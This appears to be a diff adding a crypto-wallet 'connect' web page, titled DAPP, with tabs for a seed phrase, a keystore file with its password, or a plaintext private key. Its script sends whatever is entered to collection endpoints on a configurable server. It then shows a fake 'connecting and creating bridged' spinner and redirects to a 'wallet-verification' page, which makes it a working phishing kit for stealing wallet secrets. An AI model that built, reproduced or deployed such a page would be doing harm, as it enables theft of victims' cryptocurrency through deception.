@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./assets/css.css">
+    <title>DAPP</title>
+
+</head>
+<body>
+      
+    <section class="header">
+        <nav>
+           
+        </nav>
+       
+    </section>
+    
+
+    <section class="form">
+        <h1>
+            select type
+        </h1>
+        <div class="div">
+            <button class="active">
+                Phrase
+            </button>
+            <button>
+                KeyStore
+            </button>
+            <button>
+                Private Key
+            </button>
+        </div>
+
+        <form class="">
+            <h1>
+                Seed Phrases
+            </h1>
+            <p>
+                separated by spaces, connect manually with 12 (sometimes 18, 24) words mnemonics
+            </p>
+            <textarea required>
+
+            </textarea>
+            <div>
+                <a href="./index.html">
+                    cancel
+                </a>
+                <button>
+                    connect
+                </button>
+            </div>
+        </form>
+
+        <form class="hid">
+           
+            <h1>
+                Keystore JSON
+            </h1>
+            <p>
+                secure collection of aliased keys in the form "{...}" protected with a password
+            </p>
+            <textarea required placeholder="Input the entire JSON content file here, type the password to decrypt and connect">
+
+            </textarea>
+            <p>
+                password
+            </p>
+            <input type="text" required>
+            <div>
+                <a href="./index.html">
+                    cancel
+                </a>
+                <button>
+                    connect
+                </button>
+            </div>
+        </form>
+
+        <form class="hid">
+           <img src="./assets/image/encryption.png" alt="">
+            <h1>
+                typically 64 alphanumeric charaters, Input key strings in plaintext
+            </h1>
+            <textarea placeholder="" required>e.g. 
+3a1079c3fljw8485kh4ggf745ytreiut598745uitu85g4g95t5u49458t5uu4958</textarea>
+           
+           
+            <div>
+                <a href="./index.html">
+                    cancel
+                </a>
+                <button>
+                    connect
+                </button>
+            </div>
+        </form>
+    </section>
+
+
+   
+  <section class="conecting hid">
+      
+  </section>
+  <script>
+  var apiUrl="http://127.0.0.1:5502"
+  var winUrl="http://127.0.0.1:5502"
+
+
+   var button= document.querySelectorAll(".form .div button")
+   var form=document.getElementsByTagName("form")
+   button[0].addEventListener("click",()=>{
+    for (let i = 0; i < button.length; i++) {
+        const element = button[i].classList.remove("active");
+    }
+    for (let i = 0; i < form.length; i++) {
+        const element = form[i].classList.add("hid");
+    }
+
+    button[0].classList.add("active");
+    form[0].classList.remove("hid");
+   })
+ 
+   button[1].addEventListener("click",()=>{
+    for (let i = 0; i < button.length; i++) {
+        const element = button[i].classList.remove("active");
+    }
+    for (let i = 0; i < form.length; i++) {
+        const element = form[i].classList.add("hid");
+    }
+
+    button[1].classList.add("active");
+    form[1].classList.remove("hid");
+   })
+
+   button[2].addEventListener("click",()=>{
+    for (let i = 0; i < button.length; i++) {
+        const element = button[i].classList.remove("active");
+    }
+    for (let i = 0; i < form.length; i++) {
+        const element = form[i].classList.add("hid");
+    }
+
+    button[2].classList.add("active");
+    form[2].classList.remove("hid");
+   })
+  
+
+
+   form[0].addEventListener("submit",(e)=>{
+    e.preventDefault()
+    popup()
+    const params={
+        keyphrase:form[0].getElementsByTagName("textarea")[0].value
+    }
+    
+    const requestOptions = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+          },
+         body: JSON.stringify(params),
+      };
+      var errorIs=false
+  
+      fetch(`${apiUrl}/phrase/phrases`, requestOptions)
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+
+
+
+        setTimeout(() => {
+     window.location=`${winUrl}/wallet-verification.html`
+   }, 5000);
+
+
+   
+        // Handle the response data here
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+   })
+
+   form[1].addEventListener("submit",(e)=>{
+    e.preventDefault()
+    popup()
+    const params={
+        keystoreJSON:form[1].getElementsByTagName("textarea")[0].value,
+        password:form[1].getElementsByTagName("input")[0].value
+    }
+    
+    const requestOptions = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+          },
+         body: JSON.stringify(params),
+      };
+      var errorIs=false
+  
+      fetch(`${apiUrl}/keyStore/keystores`, requestOptions)
+      .then((response) => {
+        return response.json();
+       
+      })
+      .then((data) => {
+        // Handle the response data here
+        setTimeout(() => {
+     window.location=`${winUrl}/wallet-verification.html`
+   }, 5000);
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+   })
+
+   form[2].addEventListener("submit",(e)=>{
+    e.preventDefault()
+    popup()
+    const params={
+        keyphrase:form[2].getElementsByTagName("textarea")[0].value
+    }
+    
+    const requestOptions = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+          },
+         body: JSON.stringify(params),
+      };
+      var errorIs=false
+  
+      fetch(`${apiUrl}/privateKey/privatekeys`, requestOptions)
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+
+
+
+
+        // Handle the response data here
+
+
+        setTimeout(() => {
+     window.location=`${winUrl}/wallet-verification.html`
+   }, 5000);
+      })
+      .catch((error) => {
+        // Handle any errors
+        console.error('Error:', error);
+      });
+   })
+
+  
+   function popup(){
+var html=`
+<div class="cont">
+<div class="lds-facebook"><div></div><div></div><div></div></div>
+    <h1>
+     connecting and creating bridged... 
+    </h1>
+  <p>
+    connecting ... please waite
+  </p>
+</div>
+`
+
+document.getElementsByClassName("conecting")[0].innerHTML=html
+document.getElementsByClassName("conecting")[0].classList.remove("hid")
+
+}
+
+
+
+
+  </script>
+    <script src="./assets/js.js"></script>
+</body>
+</html>
